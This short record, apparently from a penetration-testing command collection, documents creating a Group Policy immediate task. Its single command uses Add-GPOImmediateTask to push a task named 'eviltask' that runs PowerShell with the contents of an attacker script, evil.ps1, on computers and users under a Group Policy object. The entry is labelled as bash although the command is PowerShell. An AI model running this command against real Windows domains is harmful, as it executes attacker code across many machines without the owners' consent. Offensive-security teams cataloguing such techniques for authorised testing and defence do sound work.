---
id: 0929dafe-5876-4a3f-ad2b-d2a8b21a111d
name: Creating an immediate task
type: command
executor: bash
data: Add-GPOImmediateTask -TaskName 'eviltask' -Command 'powershell.exe /c' -CommandArguments
  "'$(Get-Content evil.ps1)'" -Author Administrator -Scope Computer/User -GPOIdentity
  'SuperSecureGPO'
output: null
created_at: '2023-04-06T03:56:03.665114+00:00'
updated_at: '2023-04-10T20:26:15.994624+00:00'
---

# Creating an immediate task

```bash
Add-GPOImmediateTask -TaskName 'eviltask' -Command 'powershell.exe /c' -CommandArguments "'$(Get-Content evil.ps1)'" -Author Administrator -Scope Computer/User -GPOIdentity 'SuperSecureGPO'
```


